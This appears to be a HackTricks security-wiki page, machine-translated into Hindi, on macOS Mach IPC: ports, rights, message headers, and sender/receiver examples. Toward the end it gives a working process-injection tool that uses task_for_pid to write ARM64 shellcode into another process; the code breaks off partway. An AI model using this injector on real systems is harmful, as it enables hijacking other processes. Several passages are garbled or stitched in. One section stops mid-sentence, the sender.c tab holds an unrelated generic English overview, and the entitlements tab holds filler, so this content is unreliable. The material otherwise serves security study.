# macOS IPC - इंटर प्रोसेस कम्यूनिकेशन

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप अपनी कंपनी का विज्ञापन **HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, **The PEASS Family** की खोज करें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में **PR जमा करके** अपने हैकिंग ट्रिक्स साझा करें।

</details>

## पोर्ट के माध्यम से Mach संदेश

### मौलिक जानकारी

Mach **कार्यों** का उपयोग संसाधन साझा करने के लिए **सबसे छोटी इकाई** के रूप में करता है, और प्रत्येक कार्य में **कई धागे** हो सकते हैं। ये **कार्य और धागे 1:1 से POSIX प्रक्रियाओं और धागों के साथ मैप होते हैं**।

कार्यों के बीच संचार Mach इंटर-प्रोसेस कम्यूनिकेशन (IPC) के माध्यम से होता है, जो एक-तरफा संचार चैनलों का उपयोग करता है। **संदेश पोर्टों के बीच स्थानांतरित किए जाते हैं**, जो कर्नेल द्वारा प्रबंधित **संदेश कतारों** की तरह कार्य करते हैं।

**पोर्ट** Mach IPC का **मौलिक** तत्व है। इसका उपयोग **संदेश भेजने और प्राप्त करने** के लिए किया जा सकता है।

प्रत्येक प्रक्रिया के पास एक **IPC तालिका** होती है, जिसमें प्रक्रिया के **mach पोर्ट** मिल सकते हैं। मच पोर्ट का नाम वास्तव में एक संख्या है (कर्नेल ऑब्जेक्ट के लिए एक पॉइंटर)।

एक प्रक्रिया एक पोर्ट नाम को कुछ अधिकारों के साथ **एक विभिन्न कार्य** को भेज सकती है और कर्नेल इसे **दूसरे कार्य की IPC तालिका में** दर्शाएगा।

### पोर्ट अधिकार

पोर्ट अधिकार, जो यह परिभाषित करते हैं कि एक कार्य किस कार्रवाई कर सकता है, इस संचार के लिए महत्वपूर्ण हैं। संभावित **पोर्ट अधिकार** हैं ([यहाँ से परिभाषाएँ](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **प्राप्ति अधिकार**, जो पोर्ट को भेजे गए संदेश प्राप्त करने की अनुमति देता है। Mach पोर्ट MPSC (एकाधिक उत्पादक, एक उपभोक्ता) कतारें होती हैं, जिसका मतलब है कि पूरे सिस्टम में प्रत्येक पोर्ट के लिए केवल **एक प्राप्ति अधिकार हो सकता है** (जैसे कि पाइप्स में, जहां कई प्रक्रियाएं सभी एक पाइप के पढ़ने के अंत के लिए फ़ाइल डिस्क्रिप्टर्स को धारण कर सकती हैं)।
* **प्राप्ति अधिकार वाले कार्य** संदेश प्राप्त कर सकते हैं और **भेजने के अधिकार बना सकते हैं**, जिससे उसे संदेश भेजने की अनुमति मिलती है। मूल रूप से केवल **अपने कार्य के पास प्राप्ति अधिकार होता है**।
* अगर प्राप्ति अधिकार के मालिक **मर जाता है** या उसे मार देता है, तो **भेजने का अधिकार अनर्थक (मरा नाम) हो जाता है**।
* **भेजने का अधिकार**, जो पोर्ट को संदेश भेजने की अनुमति देता है।
* भेजने का अधिकार **क्लोन** किया जा सकता है ताकि भेजने का अधिकार वाले कार्य अधिकार को क्लोन कर सके और इसे तीसरे कार्य को **प्रदान** कर सके।
* ध्यान दें कि **पोर्ट अधिकार** Mac संदेश के माध्यम से भी **पारित** किए जा सकते हैं।
* **एक बार भेजने का अधिकार**, जो पोर्ट को एक संदेश भेजने की अनुमति देता है और फिर गायब हो जाता है।
* यह अधिकार **क्लोन नहीं** किया जा सकता है, लेकिन इसे **हटाया** जा सकता है।
* **पोर्ट सेट अधिकार**, जो एक _पोर्ट सेट_ को दर्शाता है बल्कि एक एकल पोर्ट नहीं। पोर्ट सेट से संदेश को डीक्यू करने से यह उसमें शामिल पोर्टों में से एक से संदेश को डीक्यू करता है। पोर्ट सेट का उपयोग कई पोर्टों पर सुनने के लिए किया जा सकता है, जैसे `select`/`poll`/`epoll`/`kqueue` Unix में।
* **मरा नाम**, जो वास्तव में एक पोर्ट अधिकार नहीं है, बल्कि केवल एक जगहधारी है। जब एक पोर्ट नष्ट होता है, तो पोर्ट के सभी मौजूदा पोर्ट अधिकार मरे नाम में बदल जाते हैं।

**कार्य अन्यों को SEND अधिकार पारित कर सकते हैं**, जिससे उन्हें संदेश वापस भेजने की अनुमति मिलती है। **SEND अधिकार भी क्लोन किया जा सकता है**, ताकि एक कार्य अधिकार को डुप्लिकेट कर सके और तीसरे कार्य को अधिकार दे सके। इसके साथ, एक मध्यस्थ प्रक्रिया जिसे **बूटस्ट्रैप सर्वर** के रूप में जाना जाता है, के साथ मिलाकर, कार्यों के बीच प्रभावी संचार की अनुमति देता है।

### फाइल पोर्ट

फाइल पोर्ट फाइल डिस्क्रिप्टर्स को Mac पोर्ट में बंधने की अनुमति देते हैं (Mach पोर्ट अधिकार का उपयोग करके)। `fileport_makeport` का उपयोग करके दिए गए FD से `fileport` बनाना संभव है और `fileport_makefd` का उपयोग करके एक FD बनाना संभव है।

### संचार स्थापित करना

पहले से किसी अधिकार के बिना एक अधिकार भेजना संभव नहीं है, इसलिए, पहली संचार कैसे स्थापित की जाती है?

इसके लिए, **बूटस्ट्रैप सर्वर** (**मैक में launchd**) शामिल है, क्योंकि **हर कोई बूटस्ट्रैप सर्वर को SEND अधिकार** प्राप्त कर सकता है, इससे दूसरे प्रक्रिया को संदेश भेजने के लिए अधिकार मांग सकता है:

1. कार्य **A** एक **नया पोर्ट बनाता है**, जिसे पर उसके पास **प्राप्ति अधिकार** होता है।
2. कार्य **A**, प्राप्ति अधिकार के धारक के रूप में, **पोर्ट के लिए SEND अधिकार उत्पन्न करता है**।
3. कार्य **A** बूटस्ट्रैप सर्वर के साथ एक **संबंध स्थापित करता है**, और उसे उस पोर्ट
### एक Mach संदेश

[यहाँ अधिक जानकारी पाएं](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` फ़ंक्शन, मुख्य रूप से एक सिस्टम कॉल है, Mach संदेश भेजने और प्राप्त करने के लिए उपयोग किया जाता है। इस फ़ंक्शन को संदेश को पहले तर्क के रूप में भेजा जाना चाहिए। इस संदेश को `mach_msg_header_t` संरचना से आरंभ करना चाहिए, जिसके बाद वास्तविक संदेश सामग्री आती है। यह संरचना निम्नलिखित रूप में परिभाषित की गई है:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**प्राप्ति अधिकार**_ Mach पोर्ट पर संदेश प्राप्त कर सकते हैं। उल्टे, **भेजने वाले** को _**भेजने**_ या _**एक बार भेजने का अधिकार**_ प्रदान किया जाता है। एक बार भेजने का अधिकार केवल एक संदेश भेजने के लिए है, उसके बाद यह अमान्य हो जाता है।

प्रारंभिक फ़ील्ड **`msgh_bits`** एक बिटमैप है:

* पहला बिट (सबसे महत्वपूर्ण) यह दर्शाता है कि एक संदेश जटिल है (इसके बारे में और अधिक नीचे)
* तीसरा और चौथा कर्णल द्वारा उपयोग किया जाता है
* दूसरे बाइट के **5 सबसे कमजोर बिट** का उपयोग **वाउचर** के लिए किया जा सकता है: एक और प्रकार का पोर्ट कुंजी/मान संयोजन भेजने के लिए।
* तीसरे बाइट के **5 सबसे कमजोर बिट** का उपयोग **स्थानीय पोर्ट** के लिए किया जा सकता है
* चौथे बाइट के **5 सबसे कमजोर बिट** का उपयोग **दूरस्थ पोर्ट** के लिए किया जा सकता है

वाउचर, स्थानीय और दूरस्थ पोर्ट में निर्दिष्ट किए जा सकने वाले प्रकार हैं ([**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
उदाहरण के लिए, `MACH_MSG_TYPE_MAKE_SEND_ONCE` का उपयोग **सूचित** करने के लिए किया जा सकता है कि इस पोर्ट के लिए एक **एक-बार-भेजें** **अधिकार** उत्पन्न और स्थानांतरित किया जाना चाहिए। इसे `MACH_PORT_NULL` को निर्दिष्ट किया जा सकता है ताकि प्राप्तकर्ता को जवाब देने की क्षमता न हो।

एक सरल **द्विदिशीय संचार** प्राप्त करने के लिए एक प्रक्रिया मशीन **संदेश हेडर** में एक _उत्तर पोर्ट_ (**`msgh_local_port`**) निर्दिष्ट कर सकती है जहां संदेश के **प्राप्तकर्ता** इस संदेश का उत्तर भेज सकता है।

{% hint style="success" %}
ध्यान दें कि इस प्रकार के द्विदिशीय संचार का उपयोग एक्सपीसी संदेशों में किया जाता है जो एक प्रतिक्रिया की उम्मीद रखते हैं (`xpc_connection_send_message_with_reply` और `xpc_connection_send_message_with_reply_sync`)। लेकिन **आम तौर पर विभिन्न पोर्ट बनाए जाते हैं** जैसा पहले स्पष्ट किया गया है ताकि द्विदिशीय संचार बनाया जा सके।
{% endhint %}

संदेश हेडर के अन्य फ़ील्ड हैं:

- `msgh_size`: पूरे पैकेट का आकार।
- `msgh_remote_port`: जिस पोर्ट पर यह संदेश भेजा गया है।
- `msgh_voucher_port`: [मश वाउचर](https://robert.sesek.com/2023/6/mach\_vouchers.html)।
- `msgh_id`: इस संदेश का आईडी, जिसे प्राप्तकर्ता द्वारा व्याख्या किया जाता है।

{% hint style="danger" %}
ध्यान दें कि **मश संदेश** एक `मश पोर्ट` के माध्यम से भेजे जाते हैं, जो मश कर्नल में बनाया गया एक **एकल प्राप्तकर्ता**, **एकाधिक भेजने वाला** संचार चैनल है। **एकाधिक प्रक्रियाएँ** एक मश पोर्ट को संदेश भेज सकती हैं, लेकिन किसी भी समय केवल **एक प्रक्रिया** इसे पढ़ सकती है।
{% endhint %}

उसके बाद संदेश **`mach_msg_header_t`** हेडर द्वारा और **बॉडी** द्वारा और **ट्रेलर** (यदि कोई हो) द्वारा बनाए जाते हैं और इसे उत्तर देने की अनुमति दे सकते हैं। इन मामलों में, कर्नल को सिर्फ एक कार्य से दूसरे कार्य तक संदेश पारित करने की आवश्यकता होती है।

एक **ट्रेलर** एक **संदेश में कर्नल द्वारा जोड़ी गई जानकारी** है (उपयोगकर्ता द्वारा सेट नहीं की जा सकती) जिसे संदेश स्वीकृति में अनुरोध किया जा सकता है झंडियों `MACH_RCV_TRAILER_<trailer_opt>` (वहाँ विभिन्न जानकारी हो सकती है जो अनुरोध की जा सकती है)।

#### जटिल संदेश

हालांकि, और भी अधिक **जटिल** संदेश हैं, जैसे अतिरिक्त पोर्ट अधिकार या साझा मेमोरी पास करने वाले, जहां कर्नल को इन वस्तुओं को प्राप्तकर्ता को भेजने की आवश्यकता होती है। इस मामले में, हेडर `msgh_bits` का सबसे महत्वपूर्ण बिट सेट किया जाता है।

पारित करने के लिए संभावित वर्णन [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) में परिभाषित हैं:
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
### Mac Ports APIs

नोट करें कि पोर्ट्स को टास्क नेमस्पेस से जुड़ा होता है, इसलिए पोर्ट बनाने या खोजने के लिए, टास्क नेमस्पेस भी क्वेरी की जाती है (अधिक जानकारी `mach/mach_port.h` में):

- **`mach_port_allocate` | `mach_port_construct`**: एक पोर्ट **बनाएं**।
- `mach_port_allocate` एक **पोर्ट सेट** भी बना सकता है: एक समूह के पोर्ट्स पर प्राप्ति अधिकार। जब भी एक संदेश प्राप्त होता है, तो इसमें संकेतित किया जाता है कि संदेश किस पोर्ट से आया है।
- `mach_port_allocate_name`: पोर्ट का नाम बदलें (डिफ़ॉल्ट रूप से 32बिट पूर्णांक)
- `mach_port_names`: लक्षित से पोर्ट नाम प्राप्त करें
- `mach_port_type`: एक नाम पर टास्क के अधिकार प्राप्त करें
- `mach_port_rename`: एक पोर्ट का नाम बदलें (FDs के लिए dup2 की तरह)
- `mach_port_allocate`: एक नया प्राप्ति, PORT\_SET या DEAD\_NAME आवंटित करें
- `mach_port_insert_right`: उस पोर्ट में एक नया अधिकार बनाएं जिस पर आपके पास प्राप्ति है
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **mach संदेश भेजने और प्राप्त करने** के लिए उपयोग किए जाने वाले फ़ंक्शन। ओवरराइट संस्करण संदेश प्राप्ति के लिए एक विभिन्न बफ़र निर्दिष्ट करने की अनुमति देता है (अन्य संस्करण उसे पुनः उपयोग करेगा)।
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
रजिस्ट्री से मान प्राप्त करें:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
मैसेज हेडर की जांच करें और पहला आर्ग्यूमेंट देखें:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
ऐसे प्रकार का `mach_msg_bits_t` एक उत्तर की अनुमति देने के लिए बहुत सामान्य है।



### द्वारों की गणना
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**नाम** पोर्ट का डिफ़ॉल्ट नाम है (जांचें कि पहले 3 बाइट्स में कैसे **बढ़ रहा** है)। **`ipc-object`** पोर्ट की **विशिष्ट पहचानकर्ता** है जिसे **अस्पष्ट** बनाया गया है।
ध्यान दें कि केवल **`send`** अधिकार वाले पोर्ट के स्वामी की पहचान कैसे की जा रही है (पोर्ट नाम + pid)।
यहाँ ध्यान दें कि **`+`** का उपयोग करके **उसी पोर्ट से जुड़े अन्य कार्यों** को दर्शाने के लिए किया जा रहा है।

[**procesxp**](https://www.newosxbook.com/tools/procexp.html) का उपयोग करके भी **पंजीकृत सेवा नामों** (SIP अक्षम होने के कारण `com.apple.system-task-port` की आवश्यकता होने पर) देखना संभव है:
```
procesp 1 ports
```
आप इस टूल को iOS में इंस्टॉल कर सकते हैं, इसे [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) से डाउनलोड करके।

### कोड उदाहरण

ध्यान दें कि **भेजने वाला** एक पोर्ट आवंटित करता है, `org.darlinghq.example` नाम के लिए एक **भेजने का अधिकार** बनाता है और इसे **बूटस्ट्रैप सर्वर** को भेजता है जबकि भेजने वाला उस नाम के **भेजने का अधिकार** मांगता है और उसे उसे को **संदेश भेजने** के लिए उपयोग करता है।

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}  
## macOS IPC (Inter-Process Communication)

### Overview

Inter-Process Communication (IPC) mechanisms are essential for processes to communicate with each other on macOS. This can be abused by malicious actors to escalate privileges or perform other unauthorized actions.

### Techniques

1. **Mach Ports**: Mach ports are endpoints for Mach messages, allowing processes to send and receive messages. Malicious actors can abuse Mach ports for IPC-based attacks.

2. **XPC Services**: XPC services are lightweight, secure processes that provide inter-process communication. Attackers can exploit insecure XPC services to escalate privileges.

3. **Distributed Objects**: Distributed Objects is an IPC mechanism that allows objects to be used across process boundaries. This can be abused for privilege escalation attacks.

### Mitigations

- **Use Code Signing**: Ensure that all processes involved in IPC are properly code-signed to prevent unauthorized processes from communicating.
- **Implement Secure Communication**: Encrypt and authenticate messages sent over IPC channels to prevent eavesdropping and tampering.
- **Least Privilege**: Follow the principle of least privilege when designing IPC mechanisms to restrict processes to only necessary privileges.
- **Monitor IPC Activity**: Regularly monitor IPC activity for any suspicious behavior or unauthorized communication attempts.

By understanding macOS IPC mechanisms and implementing proper security measures, you can protect your system from privilege escalation and unauthorized process abuse.  
{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
### विशेषाधिकारित पोर्ट

* **होस्ट पोर्ट**: यदि किसी प्रक्रिया के पास इस पोर्ट पर **भेजने** की अनुमति है तो वह **सिस्टम** के बारे में **जानकारी** प्राप्त कर सकता है (जैसे `host_processor_info`।)
* **होस्ट प्रिव पोर्ट**: इस पोर्ट पर **भेजने** के अधिकार वाली प्रक्रिया उच्चाधिकारित क्रियाएँ कर सकती है जैसे कर्नेल एक्सटेंशन लोड करना। **प्रक्रिया को रूट होना चाहिए** इस अनुमति को प्राप्त करने के लिए।
* इसके अतिरिक्त, **`kext_request`** API को बुलाने के लिए अन्य entitlements **`com.apple.private.kext*`** की आवश्यकता है जो केवल Apple binaries को दी जाती हैं।
* **कार्य नाम पोर्ट:** _कार्य पोर्ट_ का एक अअधिकारित संस्करण। यह कार्य को संदर्भित करता है, लेकिन इसे नियंत्रित करने की अनुमति नहीं देता। इसके माध्यम से केवल `task_info()` उपलब्ध लगता है।
* **कार्य पोर्ट** (जिसे कर्नेल पोर्ट भी कहा जाता है)**:** इस पोर्ट पर भेजने के अधिकार से कार्य को नियंत्रित करना संभव है (मेमोरी पढ़ना/लिखना, थ्रेड बनाना...।)
* कॉल करें `mach_task_self()` ताकि कॉलर कार्य के लिए इस पोर्ट का नाम प्राप्त कर सके। यह पोर्ट केवल **`exec()`** के अवसर पर विरासत में मिलता है; `fork()` के साथ नया कार्य बनाया जाता है (एक विशेष मामले के रूप में, एक कार्य को `exec()` के बाद भी एक नया कार्य पोर्ट मिलता है।) कार्य उत्पन्न करने और इसका पोर्ट प्राप्त करने का एकमात्र तरीका "पोर्ट स्वैप नृत्य" करना है जब `fork()` किया जा रहा हो।
* इस पोर्ट तक पहुंचने की प्रतिबंधाएं (बाइनरी `AppleMobileFileIntegrity` से `macos_task_policy` से):
* यदि ऐप के पास **`com.apple.security.get-task-allow` entitlement** है तो **एक ही उपयोगकर्ता के प्रक्रियाएँ कार्य पोर्ट तक पहुंच सकती हैं** (डीबगिंग के लिए Xcode द्वारा सामान्य रूप से जोड़ा जाता है)। **नोटराइजेशन** प्रक्रिया इसे उत्पादन रिलीज़ में नहीं देगी।
* **`com.apple.system-task-ports`** entitlement वाली ऐप्स किसी भी प्रक्रिया के लिए **कार्य पोर्ट प्राप्त कर सकती हैं**, केवल कर्नेल को छोड़कर। पुराने संस्करणों में इसे **`task_for_pid-allow`** कहा जाता था। यह केवल Apple एप्लिकेशन्स को प्रदान किया जाता है।
* **रूट किसी भी** हार्डन्ड **रनटाइम के साथ कंपाइल नहीं की गई** ऐप्स के कार्य पोर्ट तक पहुंच सकता है (और ना ही Apple के द्वारा)।

### शैलकोड इंजेक्शन थ्रेड के माध्यम से कार्य पोर्ट में

आप एक शैलकोड प्राप्त कर सकते हैं:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}  
### अधिकार (Entitlements)

यह फ़ाइल एप्लिकेशन के लिए विशेष अधिकारों को परिभाषित करती है जो उसे उपयोग करने की अनुमति देती हैं। यह अधिकारों को सीमित करने और सुनिश्चित करने में मदद करती ह।  
{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**कंपाइल** करें पिछले प्रोग्राम को और **अधिकार** जोड़ें कोड इंजेक्शन करने के लिए एक ही उपयोगकर्ता के साथ (अगर नहीं तो आपको **sudo** का उपयोग करने की आवश्यकता होगी)।

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
